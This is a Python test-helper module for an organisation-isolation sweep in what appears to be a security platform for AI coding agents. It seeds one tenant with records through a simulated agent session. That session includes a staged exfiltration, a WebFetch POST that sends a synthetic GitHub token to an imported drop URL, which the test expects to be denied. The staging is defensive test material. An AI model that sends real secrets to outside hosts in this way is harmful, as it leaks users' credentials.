"""Builders for ``test_org_isolation_sweep.py``: one of every org-owned record in organisation A,
created through the public API, plus the probe machinery that requests them as organisation B.

Everything A owns is created by the real pipeline and routes (no hand-made rows), so the sweep
exercises the same lookups production uses.
"""

from __future__ import annotations

import json
import re
import secrets
import uuid
from collections.abc import Callable, Iterator
from dataclasses import dataclass, field
from typing import Any

from fastapi.testclient import TestClient
from sqlalchemy import select
from sqlalchemy.orm import Session

from app.database.base import Base
from app.models import User
from app.simulations.payloads import (
    DROP_URL,
    MALICIOUS_README,
    env_file_content,
    synthetic_aws_secret,
    synthetic_github_token,
)
from tests.conftest import OrgCtx

API = "/api/v1"
_CROCKFORD = "0123456789ABCDEFGHJKMNPQRSTVWXYZ"
_ID = re.compile(r"\b[a-z]{2,4}_[0-9A-HJKMNP-TV-Z]{26}\b")


def ok(response: Any, status: int | tuple[int, ...] = (200, 201)) -> Any:
    expected = status if isinstance(status, tuple) else (status,)
    assert response.status_code in expected, (
        f"{response.request.method} {response.request.url}: {response.text}"
    )
    return response.json() if response.content else None


def fake_like(real: str) -> str:
    """An id with the same prefix that exists nowhere (for the 'indistinguishable from absent' check)."""
    prefix = real.split("_", 1)[0] if "_" in real else "x"
    return f"{prefix}_" + "".join(secrets.choice(_CROCKFORD) for _ in range(26))


def _event(event_type: str, session: str, agent: str, **fields: Any) -> dict[str, Any]:
    return {
        "event_id": f"evt-{uuid.uuid4().hex}",
        "event_type": event_type,
        "timestamp": "2026-11-11T10:00:00+00:00",
        "agent": {"name": agent, "framework": "claude_code"},
        "session_id": session,
        "integration": "claude_code",
        **fields,
    }


def _tool(session: str, agent: str, name: str, arguments: dict[str, Any]) -> dict[str, Any]:
    return _event(
        "tool.requested",
        session,
        agent,
        tool={"name": name, "provider": "claude_code"},
        arguments=arguments,
        correlation_id=f"tu-{uuid.uuid4().hex[:12]}",
    )


@dataclass
class World:
    """Ids of organisation A's records (``ids``) and B's own parents (``own``)."""

    ids: dict[str, str] = field(default_factory=dict)
    own: dict[str, str] = field(default_factory=dict)
    agent_name: str = ""
    external_session: str = ""

    def fake(self) -> dict[str, str]:
        return {k: fake_like(v) for k, v in self.ids.items()}


def build_org_a(client: TestClient, a: OrgCtx, db: Session) -> World:
    """One of every org-owned record, created as A through the API."""
    from tests.integration.workspace_support import add_member

    w = World(
        agent_name=f"isolation-agent-{uuid.uuid4().hex[:6]}", external_session=f"iso-{uuid.uuid4().hex[:8]}"
    )
    u, k, ids = a.user_headers, a.api_headers, w.ids
    sid, name = w.external_session, w.agent_name

    def post(path: str, body: dict[str, Any], headers: dict[str, str] = u) -> Any:
        return ok(client.post(f"{API}{path}", json=body, headers=headers))

    def events(*batch: dict[str, Any]) -> list[dict[str, Any]]:
        results = post("/events", {"events": list(batch)}, k)["results"]
        assert all(r["status"] == "accepted" for r in results), results
        return results

    def decide(envelope: dict[str, Any]) -> dict[str, Any]:
        return post("/decide", envelope, k)

    ids["agent"] = post("/agents", {"name": name, "framework": "claude_code"})["id"]
    token = synthetic_github_token()
    events(_event("session.started", sid, name))
    for path, content in (
        ("/work/app/.env", env_file_content(token, synthetic_aws_secret())),
        ("/work/app/README.md", MALICIOUS_README),
    ):
        request = _tool(sid, name, "Read", {"file_path": path})
        decide(request)
        done = events(
            _event(
                "tool.completed",
                sid,
                name,
                tool=request["tool"],
                arguments=request["arguments"],
                correlation_id=request["correlation_id"],
                result=content,
            )
        )[0]
        ids["item"] = done["refs"]["context_item_id"]
    held = decide(_tool(sid, name, "WebFetch", {"url": "https://status.partner-api.example/health"}))
    assert held["decision"] == "REQUIRE_APPROVAL", held
    ids["approval"] = held["approval_id"]
    denied = decide(_tool(sid, name, "WebFetch", {"url": DROP_URL, "method": "POST", "body": f"t={token}"}))
    assert denied["decision"] == "DENY", denied
    ids["decision"], ids["invocation"] = denied["policy_decision_id"], denied["tool_invocation_id"]

    session = next(
        s for s in ok(client.get(f"{API}/sessions", headers=u))["items"] if s["external_session_id"] == sid
    )
    ids["session"] = session["id"]
    item = ok(client.get(f"{API}/context/items/{ids['item']}", headers=u))
    ids["source"] = item["source"]["id"]
    ids["event"] = ok(client.get(f"{API}/events", params={"limit": 1}, headers=u))["items"][0]["id"]
    ids["destination"] = ok(client.get(f"{API}/trust/destinations", headers=u))["items"][0]["id"]
    findings = ok(client.get(f"{API}/findings", params={"session_id": ids["session"]}, headers=u))["items"]
    exfil = next(f for f in findings if f["incident"])
    ids["finding"], ids["incident"] = exfil["id"], exfil["incident"]["id"]

    ids["policy"] = post(
        "/policies",
        {
            "name": "A: deny deploys",
            "outcome": "DENY",
            "conditions": {"field": "tool.name", "op": "eq", "value": "deploy"},
        },
    )["id"]
    ids["trust_rule"] = post(
        "/trust/rules", {"name": "A: vendor docs", "pattern": "docs.vendor.example", "trust_level": "TRUSTED"}
    )["id"]
    ids["user"], _ = add_member(db, a.org_id, "developer", "A Developer")
    ids["membership"] = _membership_id(client, a, ids["user"])
    ids["api_key"] = post("/org/api-keys", {"name": "A extra key", "scopes": ["read"]})["id"]

    board = post("/workspace/boards", {"name": "A board"})
    ids["board"], ids["column"] = board["id"], board["columns"][0]["id"]
    ids["task"] = post(
        "/workspace/tasks",
        {"title": "A task", "board_id": ids["board"], "related_finding_id": ids["finding"]},
    )["id"]
    ids["task2"] = post("/workspace/tasks", {"title": "A blocker", "board_id": ids["board"]})["id"]
    t = f"/workspace/tasks/{ids['task']}"
    ids["label"] = post("/workspace/tasks/labels", {"name": "a-label"})["id"]
    ids["comment"] = post(f"{t}/comments", {"body": "A comment"})["id"]
    ids["dependency"] = post(f"{t}/dependencies", {"depends_on_task_id": ids["task2"]})["id"]
    ids["ref"] = post(f"{t}/refs", {"ref_type": "agent", "ref_id": ids["agent"]})["id"]
    ids["attachment"] = post(f"{t}/attachments", {"name": "A log", "kind": "log", "content": "trace"})["id"]
    post(f"{t}/links", {"kind": "pull_request", "url": "https://git.example/pr/1", "title": "A fix"})
    ids["fix_attempt"] = post(f"{t}/fix-attempts", {"status": "in_progress"})["id"]
    ids["pack"] = post("/workspace/ai/context-packs", {"task_id": ids["task"]})["id"]
    ids["prompt"] = post("/workspace/ai/fix-context", {"task_id": ids["task"], "save": True})["prompt_id"]
    ids["template"] = post("/workspace/ai/templates", {"name": "A template", "mode": "refactor"})["id"]
    ids["run"] = post("/simulations/runs", {"scenario_id": "benign-baseline"})["id"]
    ids["suite_run"] = post("/simulations/suites", {"scenario_ids": ["benign-baseline"]})["suite_run_id"]
    return w


def _membership_id(client: TestClient, a: OrgCtx, user_id: str) -> str:
    members = ok(client.get(f"{API}/org/members", headers=a.user_headers))["items"]
    return next(m["id"] for m in members if m["user_id"] == user_id)


def build_org_b_parents(client: TestClient, b: OrgCtx, w: World) -> None:
    """B's own board, column, task and session — parents for 'own parent + foreign child' probes. B's
    agent deliberately reuses A's agent name and session id: B must get its own records."""
    u = b.user_headers
    board = ok(client.post(f"{API}/workspace/boards", json={"name": "B board"}, headers=u))
    w.own.update(board=board["id"], column=board["columns"][0]["id"])
    w.own["task"] = ok(
        client.post(f"{API}/workspace/tasks", json={"title": "B task", "board_id": board["id"]}, headers=u)
    )["id"]
    ok(
        client.post(
            f"{API}/events",
            json={"events": [_event("session.started", w.external_session, w.agent_name)]},
            headers=b.api_headers,
        )
    )
    sessions = ok(client.get(f"{API}/sessions", headers=u))["items"]
    w.own["session"] = sessions[0]["id"]
    assert w.own["session"] != w.ids["session"]
    w.own["incident"] = ok(
        client.post(f"{API}/incidents", json={"title": "B incident", "severity": "low"}, headers=u)
    )["id"]
    w.own.update(agent_name=w.agent_name, external_session=w.external_session)


def snapshot_org(db: Session, org_id: str, user_ids: list[str]) -> dict[str, list[str]]:
    """Every row organisation A owns (and its users), as canonical JSON, to prove B changed nothing."""
    db.rollback()
    out: dict[str, list[str]] = {}
    for table in Base.metadata.sorted_tables:
        cols = [c.name for c in table.columns]
        if "organization_id" in cols:
            rows = db.execute(select(table).where(table.c.organization_id == org_id)).mappings().all()
        elif table.name == User.__tablename__:
            rows = db.execute(select(table).where(table.c.id.in_(user_ids))).mappings().all()
        else:
            continue
        out[table.name] = sorted(json.dumps(dict(r), default=str, sort_keys=True) for r in rows)
    return out


def org_ids(snapshot: dict[str, list[str]]) -> set[str]:
    """Every prefixed id that appears anywhere in A's rows (primary keys, references, suite run ids...)."""
    found: set[str] = set()
    for rows in snapshot.values():
        for row in rows:
            found |= set(_ID.findall(row))
    return found


def ids_in(text: str) -> set[str]:
    return set(_ID.findall(text))


def iter_routes(app: Any) -> Iterator[tuple[str, str, Any]]:
    """``(METHOD, path, route)`` for every route the app serves, including lazily included routers."""
    from fastapi.routing import APIRoute
    from starlette.routing import Route

    def walk(router: Any, prefix: str) -> Iterator[tuple[str, Any]]:
        for route in router.routes:
            if isinstance(route, APIRoute | Route):
                yield prefix + route.path, route
            elif hasattr(route, "original_router"):
                ctx = getattr(route, "include_context", None)
                yield from walk(route.original_router, prefix + (getattr(ctx, "prefix", "") or ""))
            elif hasattr(route, "routes"):  # a mounted router or app
                yield from walk(route, prefix + getattr(route, "path", ""))

    for path, route in walk(app.router, ""):
        for method in sorted((getattr(route, "methods", None) or set()) - {"HEAD", "OPTIONS"}):
            yield method, path, route


def query_id_params(route: Any) -> list[str]:
    """Names of the route's query parameters that take an id (``*_id``)."""
    found: list[str] = []

    def walk(dep: Any) -> None:
        for q in dep.query_params:
            if q.name.endswith("_id") and q.name not in found:
                found.append(q.name)
        for sub in dep.dependencies:
            walk(sub)

    if getattr(route, "dependant", None) is not None:
        walk(route.dependant)
    return found


def strings_in(value: Any) -> set[str]:
    if isinstance(value, str):
        return {value}
    if isinstance(value, dict):
        return set().union(*(strings_in(v) for v in value.values())) if value else set()
    if isinstance(value, list | tuple):
        return set().union(*(strings_in(v) for v in value)) if value else set()
    return set()


@dataclass
class Probe:
    """One request as B, made twice: with A's ids (``foreign``) and with ids that exist nowhere (``absent``)."""

    method: str
    path: str  # under /api/v1, already formatted
    body: Any = None
    query: dict[str, str] | None = None

    def send(self, client: TestClient, headers: dict[str, str]) -> Any:
        kwargs: dict[str, Any] = {"headers": headers, "params": self.query or None}
        if self.body is not None:
            kwargs["json"] = self.body
        return client.request(self.method, f"{API}{self.path}", **kwargs)

    @property
    def sent(self) -> set[str]:
        return strings_in(self.body) | strings_in(self.query or {}) | set(self.path.split("/"))


def error_code(response: Any) -> str | None:
    try:
        body = response.json()
    except ValueError:
        return None
    return (
        body.get("error", {}).get("code")
        if isinstance(body, dict) and isinstance(body.get("error"), dict)
        else None
    )


Body = Callable[[dict[str, str], dict[str, str]], Any] | None

__all__ = [
    "API",
    "Body",
    "Probe",
    "World",
    "build_org_a",
    "build_org_b_parents",
    "error_code",
    "fake_like",
    "ids_in",
    "iter_routes",
    "ok",
    "org_ids",
    "query_id_params",
    "snapshot_org",
    "strings_in",
]
